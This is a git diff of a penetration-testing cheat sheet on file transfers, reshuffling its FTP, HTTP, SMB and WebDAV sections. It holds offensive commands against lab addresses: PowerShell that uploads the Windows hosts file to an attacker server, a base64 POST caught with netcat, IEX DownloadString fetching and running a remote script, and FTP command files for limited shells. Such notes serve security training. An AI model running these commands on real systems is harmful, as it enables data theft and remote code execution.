@@ -1,7 +1,6 @@
 # References and Links
 [Harmj0y Powershell download cradles](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)
 
-# Linux File Transfers
 # FTP
 ## Simple Python FTP Server
 - Installation
@@ -22,10 +21,31 @@ python3 -m pyftpdlib -p 21 --write
 # Windows CMD
 ftp [hostname/IP]
 get [file]
+
+# Windows Batch File (Useful for non-interactive shells
+echo open 192.168.49.128 > ftpcommand.txt
+echo open 192.168.49.128 > ftpcommand.txt
+echo USER anonymous >> ftpcommand.txt
+echo binary >> ftpcommand.txt
+echo GET file.txt >> ftpcommand.txt
+echo bye >> ftpcommand.txt
+ftp -v -n -s:ftpcommand.txt
 ```
 ## Upload
 ```
+# Windows CMD
 put [file]
+
+# Windows Powershell
+(New-Object Net.WebClient).UploadFile('ftp://10.10.10.10/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
+
+# Command File for uploads (Useful in limited shells)
+echo open 192.168.49.128 > ftpcommand.txt
+echo USER anonymous >> ftpcommand.txt
+echo binary >> ftpcommand.txt
+echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
+echo bye >> ftpcommand.txt
+ftp -v -n -s:ftpcommand.txt
 ```
 # HTTP
 ## Simple Python HTTP Server
@@ -86,8 +106,8 @@ Bypass:
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 ```
 ## Web Upload
-- Server Setup
 ```
+# Upload Server configuration
 # Create a cert for the server
 openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
 
@@ -98,7 +118,21 @@ sudo python3 -m uploadserver 443 --server-certificate [cert path]
 curl -X POST <URL> -F 'files=@<path_to_file>' -F 'files=@<path_to_file>' --insecure
 # Note multiple files in the same command. --insecure flag needed for self-signed cert
 ```
+### Powershell
+Powershell does not have a function to upload HTTP, so we'll have to build it or download it
+```
+# Powershell Upload script
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+import-module ./PSUpload.ps1
+Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File <File_to_upload>
 
+# Powershell base64 Web Upload
+$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
+# Convert file to base64 and enter into variable $b64
+Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
+# Send a web request with the base64 variable in the body
+# catch the string with netcat on the other end, and base64 decode the body, giving you the original file
+```
 # Base64 Encode/Decode
 ## Linux
 ```
@@ -146,66 +180,18 @@ sudo impacket-smbserver share -smb2support /tmp/smbshare
 sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
 ```
 
-CMD Copy a file from an SMB Server
-```cmd
-copy \\10.10.10.10\share\file
-# This command will be blocked in modern OS's that don't allow unauthenticated guest access
+## Download 
 ```
-CMD Map File share to drive letter with authentication
-```cmd
-net use n: \\10.10.10.10\share /user:username password
-```
-# FTP Downloads
-FTP Setup on linux attack host
-```bash
-# Install 
-sudo apt install python3-pyftpdlib
-# Specify the port, by default pyftpdlib uses port 2121
-sudo python3 -m pyftpdlib --port 21
-```
+# Windows
+copy \\10.10.10.10\share\file # This command will be blocked in modern OS's that don't allow unauthenticated guest access
 
-Download via FTP using Powershell
-```powershell
-(New-Object Net.WebClient).DownloadFile('ftp://10.10.10.10/file.txt', '<Output_File_Name>')
-```
+# Windows map a drive
+net use [drive letter]: \\[IP/Hostname]\[share name] /user:[username] [password]
 
-Create a batch file to download our file (useful if we don't have an interactive shell)
-```cmd
-echo open 192.168.49.128 > ftpcommand.txt
-echo open 192.168.49.128 > ftpcommand.txt
-echo USER anonymous >> ftpcommand.txt
-echo binary >> ftpcommand.txt
-echo GET file.txt >> ftpcommand.txt
-echo bye >> ftpcommand.txt
-ftp -v -n -s:ftpcommand.txt
-```
-# PowerShell Web Uploads
-PowerShell doesn't have built-in upload functionality, so we'll have to build it or download it.
+# Linux
 
-Linux Upload Server
-```bash
-# Install
-pip3 install uploadserver
-
-# Usage
-python3 -m uploadserver
 ```
-
-PowerShell Script to Upload a file
-```powershell
-IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
-import-module ./PSUpload.ps1
-Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File <File_to_upload>
-```
-Powershell Base64 WebUpload
-```powershell
-$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
-# Convert file to base64 and enter into variable $b64
-Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
-# Send a web request with the base64 variable in the body
-# catch the string with netcat on the other end, and base64 decode the body, giving you the original file
-```
-# SMB Uploads
+## Uploads
 Installing WebDav Server
 ```bash
 # apt
@@ -217,7 +203,7 @@ Starting the webdav python module
 ```bash
 sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
 ```
-Connecting to the WebDav share from Windows
+## Windows
 ```cmd
 dir \\10.10.10.10\DavWWWRoot
 # DavWWWRoot is not the name of a share. It's a special keyword fro the mini-redirector driver to connect to a webdav share
@@ -225,19 +211,6 @@ dir \\10.10.10.10\DavWWWRoot
 Uploading files using SMB WebDAV
 ```cmd
 copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
-```
-# FTP Uploads
-```powershell
-(New-Object Net.WebClient).UploadFile('ftp://10.10.10.10/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
-```
-Create a command file for the client to upload a file (useful in limited shells)
-```cmd
-echo open 192.168.49.128 > ftpcommand.txt
-echo USER anonymous >> ftpcommand.txt
-echo binary >> ftpcommand.txt
-echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
-echo bye >> ftpcommand.txt
-ftp -v -n -s:ftpcommand.txt
 ```
 # Transferring with Code
 # Python - Download
